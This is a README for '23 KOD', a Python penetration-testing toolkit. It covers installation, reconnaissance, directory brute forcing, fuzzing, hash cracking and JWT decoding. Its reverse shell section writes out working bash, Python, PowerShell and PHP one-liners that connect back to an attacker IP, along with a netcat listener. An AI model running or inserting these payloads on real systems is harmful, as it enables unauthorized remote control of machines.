# <div align="center">🎯 23 KOD - Cybersecurity Framework</div>

<div align="center">

[![Version](https://img.shields.io/badge/version-1.3.4-blue?style=for-the-badge)](https://github.com/fevberr/KOD)
[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.6+-yellow?style=for-the-badge)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-Linux%20|%20Windows%20|%20Termux-informational?style=for-the-badge)]()

<p align="center">
  <strong>A comprehensive cybersecurity toolkit for penetration testers, security researchers, and system administrators</strong>
</p>

[📋 Installation](#-installation) • [🛠️ Tools Guide](#-tools-guide) • [⚠️ Legal](#-legal-disclaimer) • [📚 Examples](#-examples)

</div>

---

## ⚠️ READ THIS FIRST - LEGAL DISCLAIMER

<details>
<summary><strong>IMPORTANT: Click to expand and read the complete legal disclaimer</strong></summary>

### **BEFORE YOU EVEN TOUCH 23 KOD**

#### ⚖️ Legal Stuff

This tool is for **educational purposes and authorized testing only**. By downloading, installing, or using 23 KOD, you agree to:

#### 1. **Use It Right** 
   - This is for security professionals, penetration testers, and system administrators to test their **OWN systems** or systems they have **WRITTEN PERMISSION** to test
   - Only use this tool on systems you own or have explicit authorization to test

#### 2. **Don't Be Dumb**
   - Using this to access, scan, or exploit systems without permission is **STRAIGHT UP ILLEGAL** and violates:
     - 🚫 Computer Fraud and Abuse Act (CFAA) - USA
     - 🚫 General Data Protection Regulation (GDPR) - EU
     - 🚫 Other cybercrime laws in your jurisdiction
   - Unauthorized access carries severe criminal penalties including fines and imprisonment

#### 3. **No Warranty**
   - This software comes "**AS IS**"
   - The authors and contributors **are NOT responsible** for any damages, data loss, or legal issues from using this tool
   - Use at your own risk

#### 4. **Your Responsibility**
   You are **fully responsible** for:
   - ✅ Getting proper authorization before testing
   - ✅ Following all applicable laws and regulations
   - ✅ Using this tool ethically and legally
   - ✅ Any consequences from misusing this software

#### 5. **For Education Only**
   - This tool is for learning about security research and conducting authorized penetration testing
   - Malicious activities are prohibited and are "cringe"

#### 6. **No Liability**
   - The developers, contributors, and distributors of 23 KOD **are NOT LIABLE** for any misuse, damage, or legal problems arising from using this software

---

**⚡ By using this tool, you acknowledge that you have read, understood, and agreed to these terms**

</details>

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [System Requirements](#system-requirements)
4. [Installation](#-installation)
   - [Linux/Debian Installation](#linux--debian-installation)
   - [Windows Installation](#windows-installation)
   - [Termux Installation](#termux-installation-android)
   - [macOS Installation](#macos-installation)
5. [Quick Start](#quick-start)
6. [Tools Guide](#-tools-guide)
7. [Usage Examples](#-examples)

---

## Overview

**23 KOD** is a powerful, feature-rich cybersecurity framework designed for:
- 🔍 **Reconnaissance & Information Gathering**
- 🌐 **Web Application Enumeration**
- 🔐 **Cryptographic Analysis**
- 🎨 **Visual Aesthetics & Terminal Effects**
- ⚙️ **Network Analysis**

The framework provides an intuitive menu-driven interface with a collection of specialized tools for security testing and research.

<div align="center">
  <img src="https://img.shields.io/badge/Built%20with-Python-blue" alt="Python">
  <img src="https://img.shields.io/badge/CLI-TUI%20Interface-green" alt="TUI">
  <img src="https://img.shields.io/badge/Color%20Support-Full-brightgreen" alt="Colors">
</div>

---

## Features

### 🎯 Core Features

<table>
  <tr>
    <td align="center">
      <h4>🔍 Recon Tab</h4>
      <p>Network & Domain Intelligence</p>
    </td>
    <td align="center">
      <h4>🌐 Web Enum Tab</h4>
      <p>Web Application Analysis</p>
    </td>
    <td align="center">
      <h4>🔓 Exploit Tab</h4>
      <p>Cryptography & Analysis</p>
    </td>
    <td align="center">
      <h4>🎨 Aesthetic Tab</h4>
      <p>Terminal Effects</p>
    </td>
  </tr>
</table>

### ✨ Highlights

- ✅ **7+ Reconnaissance Tools** - DNS, Port Scanning, OSINT, Whois, Reverse DNS
- ✅ **2+ Web Enumeration Tools** - Directory Bruteforce, Parameter Fuzzing
- ✅ **3+ Exploit Tools** - Hash Identification, JWT Decoding, Reverse Shell Generation
- ✅ **Beautiful CLI Interface** - Colored output, progress bars, rich panels
- ✅ **Cross-Platform** - Works on Linux, Windows, macOS, and Android (Termux)
- ✅ **No Root Required** - Works as regular user (some features may need elevation)
- ✅ **Modular Design** - Easy to add new tools and features
- ✅ **Automated Installer** - Simple package management with pip

---

## System Requirements

### Minimum Requirements

| Requirement | Details |
|---|---|
| **OS** | Linux, Windows 7+, macOS 10.9+, or Android (Termux) |
| **Python** | 3.6 or higher |
| **RAM** | 512 MB minimum |
| **Disk Space** | ~100 MB (with dependencies) |
| **Python Package Manager** | pip (usually included with Python) |

### Recommended Requirements

| Component | Recommendation |
|---|---|
| **Python Version** | 3.8 or higher |
| **RAM** | 2 GB or more |
| **Internet Connection** | Required for online lookups (Shodan, DNS, etc.) |
| **Terminal** | 80+ column width for best display |

### Dependencies

KOD automatically installs the following Python packages:

```
colorama>=0.4.6      # Cross-platform colored terminal text
termcolor>=2.2.0     # Simple colored terminal text
tqdm>=4.65.0         # Progress bars
rich>=13.7.0         # Rich terminal output
prettytable>=3.9.0   # ASCII tables for displaying data
```

---

## 🚀 Installation

### Linux / Debian Installation

#### Step 1: Install Python and pip

```bash
# Update package manager
sudo apt update && sudo apt upgrade -y

# Install Python 3 and pip
sudo apt install python3 python3-pip -y

# Verify installation
python3 --version
pip3 --version
```

#### Step 2: Clone or Download KOD

```bash
# Clone the repository
git clone https://github.com/fevberr/KOD.git
cd KOD

# OR download as ZIP
# wget https://github.com/fevberr/KOD/archive/refs/heads/main.zip
# unzip main.zip && cd KOD-main
```

#### Step 3: Install Dependencies

```bash
# Method 1: Using the built-in installer (Recommended)
python3 installer.py

# Then follow the menu:
# [1] Install all packages
# [2] Install missing packages
# [3] Refresh
# [4] Back

# Method 2: Manual installation
pip3 install -r requirements.txt

# Method 3: Individual package installation
pip3 install colorama termcolor tqdm rich prettytable
```

#### Step 4: Run KOD

```bash
# Method 1: Direct execution
python3 main.py

# Method 2: Using boot.py
python3 boot.py

# Method 3: Create a symlink for global access (Optional)
sudo ln -s $(pwd)/main.py /usr/local/bin/kod
kod  # Now you can run from anywhere
```

#### Optional: Setup Alias

Add to your `~/.bashrc` or `~/.zshrc`:

```bash
alias kod='python3 ~/path/to/KOD/main.py'
```

Then reload:
```bash
source ~/.bashrc
```

---

### Windows Installation

#### Step 1: Install Python

1. Download Python from [python.org](https://www.python.org/downloads/)
2. **IMPORTANT**: During installation, check "✓ Add Python to PATH"
3. Click "Install Now" or customize installation
4. Verify installation:

```powershell
# Open Command Prompt or PowerShell
python --version
pip --version
```

#### Step 2: Download KOD

**Option A: Using Git**
```powershell
# Install Git from https://git-scm.com if not already installed
git clone https://github.com/fevberr/KOD.git
cd KOD
```

**Option B: Manual Download**
1. Visit https://github.com/fevberr/KOD
2. Click "Code" → "Download ZIP"
3. Extract the ZIP file to a folder (e.g., `C:\Users\YourName\Desktop\KOD`)
4. Open Command Prompt/PowerShell and navigate to the folder:

```powershell
cd C:\Users\YourName\Desktop\KOD
```

#### Step 3: Install Dependencies

```powershell
# Method 1: Using the built-in installer
python installer.py

# Method 2: Manual installation
pip install -r requirements.txt

# Method 3: Individual packages
pip install colorama termcolor tqdm rich prettytable
```

#### Step 4: Run KOD

```powershell
# Direct execution
python main.py

# Or with python3 (if aliased)
python3 main.py
```

#### Create Windows Batch File (Optional)

Create `kod.bat` in the KOD folder:

```batch
@echo off
python main.py %*
```

Then run: `kod.bat`

#### Add to Windows PATH (Optional)

1. Save `kod.bat` in a folder (e.g., `C:\KOD\`)
2. Go to: Settings → System → About → Advanced System Settings
3. Environment Variables → Path → Edit
4. Add: `C:\KOD\`
5. Restart Command Prompt, then use: `kod`

---

### Termux Installation (Android)

#### Step 1: Install Termux

1. Download Termux from [F-Droid](https://f-droid.org/packages/com.termux/)
   - **Note**: The Google Play Store version is outdated
2. Open Termux and run:

```bash
# Update Termux packages
pkg update && pkg upgrade -y

# Install required packages
pkg install python3 git wget curl -y

# Verify installation
python3 --version
pip3 --version
```

#### Step 2: Clone KOD

```bash
# Clone the repository
git clone https://github.com/fevberr/KOD.git
cd KOD

# OR download manually
wget https://github.com/fevberr/KOD/archive/refs/heads/main.zip
unzip main.zip && cd KOD-main
```

#### Step 3: Install Dependencies

```bash
# Using the built-in installer
python3 installer.py

# Or manually
pip3 install -r requirements.txt
```

#### Step 4: Run KOD

```bash
python3 main.py
```

#### Setup Termux Alias (Optional)

1. Edit `~/.bashrc`:
```bash
nano ~/.bashrc
```

2. Add at the end:
```bash
alias kod='python3 ~/storage/downloads/KOD/main.py'
```

3. Save and reload:
```bash
source ~/.bashrc
```

#### Grant File Permissions (If needed)

```bash
termux-setup-storage

# Navigate to downloads
cd ~/storage/downloads/KOD
python3 main.py
```

---

### macOS Installation

#### Step 1: Install Python

**Using Homebrew (Recommended):**
```bash
# Install Homebrew if not installed
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install Python
brew install python3

# Verify
python3 --version
pip3 --version
```

**OR download from python.org:**
1. Visit https://www.python.org/downloads/macos/
2. Download and run the installer

#### Step 2: Clone KOD

```bash
# Clone repository
git clone https://github.com/fevberr/KOD.git
cd KOD

# OR download manually
curl -L https://github.com/fevberr/KOD/archive/refs/heads/main.zip -o KOD.zip
unzip KOD.zip && cd KOD-main
```

#### Step 3: Install Dependencies

```bash
# Using the installer
python3 installer.py

# Or manually
pip3 install -r requirements.txt
```

#### Step 4: Run KOD

```bash
python3 main.py
```

#### Create macOS Alias (Optional)

Add to `~/.zshrc` (zsh) or `~/.bash_profile` (bash):

```bash
alias kod='python3 ~/path/to/KOD/main.py'
```

Reload:
```bash
source ~/.zshrc
```

---

## Quick Start

### Basic Usage

```bash
# 1. Navigate to KOD directory
cd /path/to/KOD

# 2. Run the application
python3 main.py

# 3. You'll see the main menu with tabs:
#    [Home] [Exploit Tab] [Recon Tab] [Web Enum Tab]

# 4. Navigate using number keys or arrow keys
# 5. Select a tool and follow prompts
# 6. Results will be displayed in formatted tables
```

### Menu Navigation

```
╔════════════════════════════════════════╗
║         23 KOD - Main Menu             ║
║                                        ║
║ [1] Home          (Aesthetics)         ║
║ [2] Exploit Tab   (Hash, JWT, etc.)    ║
║ [3] Recon Tab     (Network & OSINT)    ║
║ [4] Web Enum Tab  (Web Security)       ║
║                                        ║
║ [q] Quit                               ║
╚════════════════════════════════════════╝

Use arrow keys or number keys to navigate
Press Enter to select a tool
```

---

## 🛠️ Tools Guide

### 📍 Home Tab - Aesthetic & Visual Effects

#### 1. **Matrix Rain** 🌧️

Creates a Matrix-style falling text effect in your terminal.

**Purpose**: Visual effect, showcasing terminal capabilities

**How to Use**:
```bash
# Simply select from Home tab
Matrix Rain

# Displays animated falling characters
# Press Ctrl+C to exit
```

**Example Output**:
```
ｚｙｚｚｘｗ　ｔｓｒｑｐｏ　ｎｍｌｋｊｉ　ｈｇｆｅｄｃ
ｂａ　ｙｘｗｖｕ　ｔｓｒｑｐｏ　ｎｍｌｋｊｉ　ｈｇｆｅｄｃ
```

---

#### 2. **Glitch Effect** 🎭

Creates a digital glitch animation effect.

**Purpose**: Entertainment and ASCII art demonstration

**How to Use**:
```bash
# Select from Home tab
Glitch Effect

# Displays glitching text animation
# Press Ctrl+C to exit
```

---

#### 3. **Bad Apple** 🍎

Displays the "Bad Apple" ASCII animation.

**Purpose**: Nostalgic ASCII animation demo

**How to Use**:
```bash
# Select from Home tab
bad apple.py

# Full screen ASCII animation plays
# Press Ctrl+C to exit
```

---

### 🔍 Recon Tab - Network & OSINT Intelligence

#### 1. **DNS Lookup** 🌐

Performs comprehensive DNS lookups to gather information about a domain.

**Purpose**: 
- Find A, AAAA, MX, NS, SOA, TXT records
- Gather DNS information for target domain
- Identify mail servers, DNS servers

**How to Use**:
```bash
# Select from Recon Tab
DNS lookup

# Enter domain: example.com

# Output shows:
# A Records: IP addresses
# AAAA Records: IPv6 addresses
# MX Records: Mail servers
# NS Records: Nameservers
# SOA Records: Zone info
# TXT Records: Text records
```

**Example**:
```
Domain: google.com
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

A Records:
  142.250.185.46
  142.250.185.78

MX Records:
  10 smtp.google.com
  20 alt1.aspmx.l.google.com

NS Records:
  ns1.google.com
  ns2.google.com
```

**Commands for Linux (standalone)**:
```bash
nslookup example.com
dig example.com
host example.com
```

---

#### 2. **Port Scanner** 🔌

Scans target host for open ports and identifies running services.

**Purpose**:
- Identify open ports on target
- Detect running services
- Find vulnerabilities

**How to Use**:
```bash
# Select from Recon Tab
Port Scanner

# Enter target: 127.0.0.1 or example.com
# Enter port range: 1-1000 (or specific: 22,80,443)
# Enter threads: 10-50 (higher = faster but more load)

# Wait for scan to complete
# View results in table format
```

**Example Output**:
```
Target: localhost
Scanning ports 1-1000...
━━━━━━━━━━━━━━━━━━━━━━━━

PORT    STATE  SERVICE
21      open   FTP
22      open   SSH
80      open   HTTP
443     open   HTTPS
3306    open   MySQL
```

**Scan Types**:
- **Quick Scan**: 1-1000 (common ports)
- **Standard Scan**: 1-10000
- **Full Scan**: 1-65535
- **Custom Range**: e.g., 1024-65535

---

#### 3. **Reverse DNS** ⬅️

Performs reverse DNS lookups to find domain names for IP addresses.

**Purpose**:
- Find hostnames from IP addresses
- Identify services behind IPs
- OSINT reconnaissance

**How to Use**:
```bash
# Select from Recon Tab
Reverse DNS

# Enter IP address: 8.8.8.8
# Tool resolves to hostname(s)

# Output shows:
# IP: 8.8.8.8
# Hostname: dns.google
```

**Example**:
```
IP: 8.8.8.8
━━━━━━━━━━━━━━━━━━━━━━━━
Hostname: dns.google

IP: 1.1.1.1
━━━━━━━━━━━━━━━━━━━━━━━━
Hostname: one.one.one.one
```

---

#### 4. **Whois Lookup** 📋

Retrieves WHOIS information about domain registration details.

**Purpose**:
- Find domain owner information
- Get registration and expiry dates
- Identify registrars and nameservers
- OSINT intelligence gathering

**How to Use**:
```bash
# Select from Recon Tab
Whois Lookup

# Enter domain: example.com
# Tool queries WHOIS database

# Results show:
# Registrant information
# Registration date
# Expiry date
# Registrar
# Nameservers
```

**Example Output**:
```
Domain: example.com
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Registrant: John Doe
Organization: Example Corp
Email: admin@example.com
Registration Date: 2020-01-15
Expiry Date: 2025-01-15
Registrar: ICANN Registrar
Status: Active
```

---

#### 5. **Shodan Lookup** 🔎

Queries Shodan search engine for internet-connected devices information.

**Requirements**:
- Shodan API Key (free account: https://shodan.io)

**Purpose**:
- Find internet-facing services
- Identify vulnerable devices
- OSINT on targets
- Banner grabbing at scale

**How to Use**:
```bash
# Select from Recon Tab
Shodan lookup

# Enter target: example.com or IP
# Tool searches Shodan database
# (Requires API key in config)

# Results show:
# Found services
# Open ports
# Service banners
# Vulnerabilities
```

**Getting Shodan API Key**:
1. Visit https://shodan.io
2. Create free account
3. Go to Dashboard → API Key
4. Copy your key
5. Configure in KOD settings

**Example**:
```
Searching: 203.0.113.42
━━━━━━━━━━━━━━━━━━━━━━━━
Port 22    SSH         OpenSSH 7.4
Port 80    HTTP        Apache 2.4.6
Port 443   HTTPS       nginx 1.14
Port 3306  MySQL       MySQL 5.7.20
```

---

#### 6. **Subdomain Enumeration** 🔗

Discovers subdomains of target domain for comprehensive reconnaissance.

**Purpose**:
- Find all subdomains
- Identify hidden services
- Map target infrastructure
- Discover additional attack surfaces

**How to Use**:
```bash
# Select from Recon Tab
Subdomain enumeration

# Enter domain: example.com
# Tool queries multiple sources:
#   - DNS database
#   - SSL certificates
#   - Search engines
#   - Public lists

# Results show discovered subdomains
```

**Example Output**:
```
Domain: example.com
Enumerating subdomains...
━━━━━━━━━━━━━━━━━━━━━━━━

Found Subdomains:
www.example.com
api.example.com
admin.example.com
mail.example.com
staging.example.com
dev.example.com
```

**Sources Queried**:
- DNS records
- SSL certificate transparency logs
- Common subdomain wordlists
- API queries

---

### 🌐 Web Enum Tab - Web Application Analysis

#### 1. **Directory Brute Force** 📁

Attempts to discover hidden directories and files on web servers.

**Purpose**:
- Find hidden admin panels
- Discover backup files
- Locate configuration files
- Identify sensitive endpoints

**How to Use**:
```bash
# Select from Web Enum Tab
Directory Brute Force

# Enter target: http://example.com
# Enter wordlist path: /usr/share/wordlists/dirb/common.txt
# Enter threads: 10-50

# Tool tests each path
# Returns HTTP status codes
```

**Example Output**:
```
Target: http://example.com
Wordlist: common.txt (4614 entries)
Threads: 20
━━━━━━━━━━━━━━━━━━━━━━━━

Status  URL
200     /index.php
200     /admin
403     /admin/backup
200     /uploads
404     /old
301     /api/v1
403     /config
200     /.git
```

**Common Status Codes**:
- `200` - Found! Page exists
- `301/302` - Redirect
- `403` - Forbidden (likely exists)
- `404` - Not found
- `500` - Server error

**Recommended Wordlists**:
```bash
# Linux
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Download if not present
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
```

---

#### 2. **Parameter Fuzzer** 🔀

Fuzzes parameters in URLs to find potential vulnerabilities.

**Purpose**:
- Discover hidden parameters
- Test for parameter injection
- Find SQLi/XSS vectors
- Identify unvalidated inputs

**How to Use**:
```bash
# Select from Web Enum Tab
Parameter Fuzzer

# Enter URL: http://example.com/search.php
# Enter parameters to test
# Enter payload wordlist

# Tool injects various payloads
# Analyzes responses for anomalies
```

**Example**:
```
URL: http://example.com/search.php?q=test
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Testing parameters:
admin, username, id, user_id, key...

Parameter 'admin' found!
Response size difference detected
Possible SQL Injection vector
```

**Common Parameters to Test**:
- `id`, `user_id`, `uid`
- `admin`, `username`, `user`
- `page`, `id`, `cat`
- `file`, `path`, `dir`
- `search`, `q`, `query`

---

### 🔓 Exploit Tab - Cryptography & Analysis

#### 1. **Hash Identifier** #️⃣

Identifies hash types and attempts decryption using multiple methods.

**Purpose**:
- Identify unknown hash types
- Crack hashes using wordlists
- Perform hash lookups
- Reverse hash databases

**How to Use**:
```bash
# Select from Exploit Tab
Hash Identifier

# Paste hash: e99a18c428cb38d5f260853678922e03
# Tool analyzes and suggests hash type(s)

# Options:
# [1] Identify type
# [2] Crack with wordlist
# [3] Online lookup
```

**Example**:
```
Hash: e99a18c428cb38d5f260853678922e03
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Possible Types:
✓ MD5 (32 chars, hex)
✓ NTLM (32 chars, hex)
  Confidence: 99%

Attempting online lookup...
Result: hello123
```

**Supported Hash Types**:
- MD5 (32 characters)
- SHA1 (40 characters)
- SHA256 (64 characters)
- SHA512 (128 characters)
- bcrypt
- Argon2
- NTLM

**Cracking Methods**:
1. Dictionary attack (wordlist)
2. Rainbow tables (online)
3. Brute force (limited)

---

#### 2. **JWT Decoder** 🔐

Decodes and analyzes JSON Web Tokens.

**Purpose**:
- Decode JWT tokens
- Analyze claims and payload
- Identify weak secrets
- Test JWT manipulation
- Verify signatures

**How to Use**:
```bash
# Select from Exploit Tab
JWT decoder

# Paste JWT token
# Tool automatically decodes into 3 parts:
#   Header.Payload.Signature

# Displays:
# - Token structure
# - Claims (sub, iat, exp, etc.)
# - Signature validity
# - Expiration status
```

**Example JWT**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Decoded Output**:
```
Header (Decoded):
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload (Decoded):
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}

Signature: Valid (if secret known)
Expires: 2024-12-31
Status: Valid ✓
```

**Common JWT Claims**:
- `sub` - Subject (user ID)
- `iat` - Issued At
- `exp` - Expiration Time
- `aud` - Audience
- `iss` - Issuer

---

#### 3. **Reverse Shell Generator** 💻

Generates reverse shell payloads for multiple platforms and languages.

**Purpose**:
- Create reverse shell one-liners
- Generate payload variations
- Support multiple languages/platforms
- Educational purposes

**How to Use**:
```bash
# Select from Exploit Tab
Reverse Shell Generator

# Enter attacker IP: 192.168.1.100
# Enter attacker port: 4444
# Select shell type (bash, powershell, python, etc.)

# Tool generates payload
# Copy and use in target
```

**Supported Shells**:

**Bash**:
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

**Python**:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PowerShell**:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**PHP**:
```php
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Usage**:
1. Set up listener on attacker machine:
```bash
nc -lvnp 4444
# or
ncat -lvnp 4444
```

2. Execute generated payload on target
3. Get interactive shell

---

## 📚 Examples

### Example 1: Complete Reconnaissance

```bash
# Step 1: Gather general information
DNS lookup → example.com
Whois Lookup → example.com
Reverse DNS → 93.184.216.34

# Step 2: Find web presence
Subdomain enumeration → example.com
# Results: www, mail, api, admin, etc.

# Step 3: Port scan discovered subdomains
Port Scanner → www.example.com
Port Scanner → api.example.com

# Step 4: Enumerate discovered services
Directory Brute Force → http://www.example.com
Parameter Fuzzer → http://api.example.com/search.php
```

### Example 2: Web Application Testing

```bash
# Step 1: Identify technologies
Port Scanner → target.com
# Results: Port 80 (HTTP), 443 (HTTPS)

# Step 2: Enumerate endpoints
Directory Brute Force → https://target.com
# Discover: /admin, /api, /uploads, etc.

# Step 3: Test parameters
Parameter Fuzzer → https://target.com/search.php?q=test
# Identify: Potential SQL injection, parameter pollution

# Step 4: Analyze tokens (if JWT found)
JWT Decoder → eyJhbGc...
# Results: Weak secret, expired token, etc.
```

### Example 3: Hash Cracking

```bash
# Step 1: Identify hash type
Hash Identifier → e99a18c428cb38d5f260853678922e03
# Result: MD5

# Step 2: Attempt lookup
# (Tool queries online databases)

# Step 3: Try wordlist
# Enter wordlist path: /path/to/rockyou.txt
# Tool cracks hash

# Result: Password found: "hello123"
```

---

## 🔧 Troubleshooting

### Issue: Python not found

**Solution**:
```bash
# Linux
sudo apt install python3 python3-pip

# Windows: Reinstall Python with PATH enabled
# macOS
brew install python3
```

### Issue: Missing dependencies

**Solution**:
```bash
# Reinstall all dependencies
pip3 install -r requirements.txt

# Or use the installer
python3 installer.py
```

### Issue: Permission Denied (Linux)

**Solution**:
```bash
# Make executable
chmod +x main.py

# Or run with python
python3 main.py
```

### Issue: No module named 'colorama'

**Solution**:
```bash
# Upgrade pip first
pip3 install --upgrade pip

# Then reinstall requirements
pip3 install -r requirements.txt
```

### Issue: Port Scanner not detecting ports

**Possible causes**:
- Firewall blocking connections
- Wrong IP/hostname format
- Target offline
- Ports actually closed

**Solution**:
```bash
# Check if target is reachable
ping target.com

# Test specific port
nc -zv target.com 80

# Try with longer timeout in KOD
# Reduce thread count for stability
```

---

## 🛡️ Security Best Practices

1. **Always Get Authorization**
   - Written permission from system owner
   - Documented scope of testing
   - Clear start and end dates

2. **Network Isolation**
   - Use VPN or isolated network for testing
   - Don't test from production network
   - Use dedicated testing machine

3. **Data Protection**
   - Store results securely
   - Don't leave sensitive data in logs
   - Delete results after testing

4. **Ethical Conduct**
   - Don't exploit found vulnerabilities
   - Report findings to organization
   - Follow responsible disclosure practices

5. **Legal Compliance**
   - Know applicable laws in your jurisdiction
   - Document authorization
   - Keep audit trail of testing

---

## 📞 Support & Contribution

### Report Issues
- GitHub Issues: [fevberr/KOD](https://github.com/fevberr/KOD/issues)

### Contribute
1. Fork the repository
2. Create feature branch
3. Make changes
4. Submit pull request

### Credits
- **Developer**: @fevberr
- **Contributors**: @devansh_d_08740
- **Special thanks**: Community testers and researchers

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

<div align="center">

**Made with ❤️ for the cybersecurity community**

⭐ If you find KOD useful, please star the repository!

**Remember: Use responsibly. Test only with permission. Stay ethical.** 🛡️

</div>

---

## Quick Reference Card

<div align="center">

| Tool | Tab | Input | Output |
|------|-----|-------|--------|
| DNS Lookup | Recon | Domain | A/MX/NS/TXT Records |
| Port Scanner | Recon | IP:Port Range | Open Ports |
| Reverse DNS | Recon | IP Address | Hostname |
| Whois | Recon | Domain | Registration Info |
| Subdomain Enum | Recon | Domain | Subdomains List |
| Directory BF | Web | URL | Found Directories |
| Parameter Fuzzer | Web | URL | Parameter Results |
| Hash Identifier | Exploit | Hash | Hash Type + Crack |
| JWT Decoder | Exploit | Token | Decoded JWT |
| Reverse Shell | Exploit | IP:Port | Shell Payload |

</div>

---

**Last Updated**: August 3, 2026 | **Version**: 1.3.4
